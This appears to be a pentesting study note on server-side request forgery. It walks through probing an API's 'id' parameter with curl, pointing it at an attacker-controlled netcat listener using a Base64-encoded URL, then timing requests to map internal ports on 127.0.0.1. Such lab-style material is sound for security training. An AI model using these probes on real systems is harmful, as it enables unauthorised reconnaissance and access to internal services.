# Server-Side Request Forgery (SSRF)
Refer to [[/Offensive Security Techniques/Web Exploitation Techniques/SSRF - Server Side Request Forgery/]] for more in-depth attacks.

Allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data.

We can usually find SSRF vulnerabilities in applications or APIs that fetch remote resources.

We should fuzz **every** identified parameter, even if it does not seem tasked with fetching remote resources.
## Example Scenario
Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api/userinfo`.

Let us first interact with it.
```shell
curl http://<TARGET IP>:3000/api/userinfo
{"success":false,"error":"'id' parameter is not given."}
```
- The API is expecting a parameter called _id_. 

Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first.
```shell
nc -nlvp 4444
```

Then, let us specify `http://<ATTACKER-IP-LISTENER>:<LISTENER PORT>` as the value of the _id_ parameter and make an API call.
```shell
curl "http://<TARGET IP>:3000/api/userinfo?id=http://<ATTACKER-IP-LISTENER>:<LISTENER PORT>"
```
- We notice an error about the _id_ parameter being invalid, and we also notice no connection being made to our listener.

In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` and making an API call again.
```shell
echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
```

```shell
curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.

As time allows, try to provide APIs with input in various formats/encodings.
## Leveraging the SSRF vulnerability to identify different ports
We can leverage the SSRF vulnerability to identify that port 3002 (in this example) is listening locally on the web server. 

First we need to Base64-encode http://127.0.0.1:3002 so we can use it as the value for the id URL parameter:
```shell
echo "http://127.0.0.1:3002" | tr -d '\n' | base64
```

Then we can use `cURL` to check the total time that it would take for the request that specifies port 3002:
```shell
curl -s -w 'Total Time: %{time_total}s\n' "http://STMIP:3000/api/userinfo?id=aHR0cDovLzEyNy4wLjAuMTozMDAy"
```
- Since it takes considerably large amount of time (18 seconds), the port must be open and listening as some communications/processes are taking place. 

We can then be assured by trying to send a request for a port that is probably not open, for example, port 8888:
```shell
echo "http://127.0.0.1:8888" | tr -d '\n' | base64
```

Then, using `cURL` shows that the requests takes only 3 seconds, thus it must be closed due to how short the total time of the request is:
```shell
curl -s -w 'Total Time: %{time_total}s\n' "http://STMIP:3000/api/userinfo?id=aHR0cDovLzEyNy4wLjAuMTo4ODg4"
```
